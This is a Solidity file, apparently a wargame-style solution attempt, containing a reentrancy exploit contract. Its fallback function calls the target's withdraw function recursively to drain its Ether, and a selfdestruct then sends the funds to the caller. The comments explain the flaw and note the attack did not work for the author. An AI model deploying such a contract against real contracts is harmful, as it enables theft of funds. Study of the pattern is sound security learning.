// For some reason it's not working, I've tried several alternatives, similar to this one, copied from google but none works. Maybe sthg has changed in Ethereum to avoid this issue.

// The explanation of the attack is as follows: since the substraction of the balance is done after sending the value we can make that when sending the value it launches the fallback function, that it also calls again the withdraw function of the attacked contract, like being recursive.

pragma solidity ^0.4.20;

contract Reentrance {
    function donate(address _to) public payable;

    function balanceOf(address _who) public view returns (uint balance);

    function withdraw(uint _amount) public;
    function() public payable;
}

contract Reentrancer {
    Reentrance public reentrance;
    constructor(address _reentrance) public {
        reentrance = Reentrance(_reentrance);
    }

    function collect () public payable {
        // initiate the balance with some value
        reentrance.donate.value(msg.value)(address(this));
        // start the recursion
        reentrance.withdraw(msg.value);
    }
  
    function withdraw () public {
        selfdestruct(msg.sender);
    }
  
    function () public payable {
        // stop the recursion if there is no longer enough eth in the contract
        if (address(reentrance).balance >= msg.value) {
            // recursively call withdraw that will call this back
            reentrance.withdraw(msg.value);
        }
    }
}
